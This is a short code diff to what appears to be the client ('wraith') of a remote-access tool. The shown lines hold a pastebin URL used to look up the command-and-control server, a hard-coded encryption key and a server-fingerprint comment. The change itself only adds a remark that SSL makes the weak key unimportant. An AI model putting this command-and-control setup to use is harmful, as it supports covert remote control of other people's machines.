@@ -25,7 +25,9 @@ start_time = time.time()
 # to allow the C&C URL to change without having to re-install all wraiths
 FETCH_SERVER_LOCATION_URL = "https://pastebin.com/raw/dAUvxiQb"
 # A key used to encrypt the first packet before a new key is sent over by the
-# server. Not the most secure communication, I know. Any replacement welcome
+# server. Not the most secure communication, I know. Any replacement welcome.
+# However, wraiths can work over SSL and so can the panel so the security
+# of this system is not critical
 CRYPT_KEY = "G39UHG83H2F92JC9H92VJ29W9HCG9WMHG2F1ZE10SKXQCSPKNXKZNBDCOG0Y"
 # The fingerprint of the server to trust. This prevents the wraith from
 # accidentally connecting and sending info to the wrong server if the
